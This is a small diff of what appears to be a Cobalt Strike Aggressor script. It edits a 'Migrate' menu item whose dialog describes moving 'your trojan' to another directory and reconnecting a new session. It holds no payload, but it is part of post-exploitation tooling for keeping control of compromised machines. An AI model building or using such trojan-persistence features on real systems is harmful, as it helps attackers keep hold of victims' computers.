@@ -150,7 +150,7 @@ sub Migrate{
             item "Migrate"{
                 local('$process');
                 $bid = $1['@'];
-                $process = Getname();
+                $process = Getname().".exe";
                 $dir = Getinfo()[1];
                 $dialog = dialog("Migrate process",%(bid => $bid, dir => $dir, pname => $process, keep => "true"), &Migrate);
                 dialog_description($dialog, "Migrate your trojan to another directory and then reconnect a new session, only native sessions are supported and can only be migrated once");
